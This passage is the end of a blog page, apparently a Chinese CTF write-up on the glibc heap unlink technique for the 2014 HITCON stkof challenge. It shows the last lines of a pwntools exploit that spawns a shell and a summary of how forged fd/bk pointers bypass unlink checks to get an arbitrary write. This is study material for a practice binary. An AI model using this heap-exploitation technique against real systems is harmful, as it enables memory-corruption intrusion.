class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果我们找到或伪造地址里面的值是伪造的chunkP的地址值</p>
<ul>
<li><p>一个地址</p>
<blockquote>
<p>我们把该地址tar，tar-0x18填入fd绕过FD+0x18&#x3D;P，tar-0x10填入bk绕过BK+0x10&#x3D;P</p>
<p>最终实现效果是在该tar地址写入tar-0x18</p>
</blockquote>
</li>
<li><p>两个地址</p>
<blockquote>
<p>tar1 和 tar2 tar1-0x18写入fd，tar2-0x10写入bk</p>
<p>tar1地址写入tar2-0x10|bk值</p>
<p>tar2地址写入tar1-0x18|fd值</p>
</blockquote>
</li>
</ul>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tag</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unlink"><span class="toc-number">1.</span> <span class="toc-text">Unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2014-HITCON-stkof"><span class="toc-number">2.</span> <span class="toc-text">2014 HITCON stkof</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E9%97%AE%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">缓冲区问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0fill%E5%9C%B0%E5%9D%80%E5%8F%AF%E6%8E%A7"><span class="toc-number">2.2.</span> <span class="toc-text">实现fill地址可控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99%EF%BC%8Cleak%E6%95%B0%E6%8D%AE%EF%BC%8C%E6%8B%BFshell%E8%B5%B0%E4%BA%BA"><span class="toc-number">2.3.</span> <span class="toc-text">任意地址读写，leak数据，拿shell走人</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">2.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&text=Unlink-2014-HITCON-stkof"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&title=Unlink-2014-HITCON-stkof"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&is_video=false&description=Unlink-2014-HITCON-stkof"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Unlink-2014-HITCON-stkof&body=Check out this article: https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&title=Unlink-2014-HITCON-stkof"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&title=Unlink-2014-HITCON-stkof"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&title=Unlink-2014-HITCON-stkof"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&title=Unlink-2014-HITCON-stkof"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&name=Unlink-2014-HITCON-stkof&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&t=Unlink-2014-HITCON-stkof"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    Grxer
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
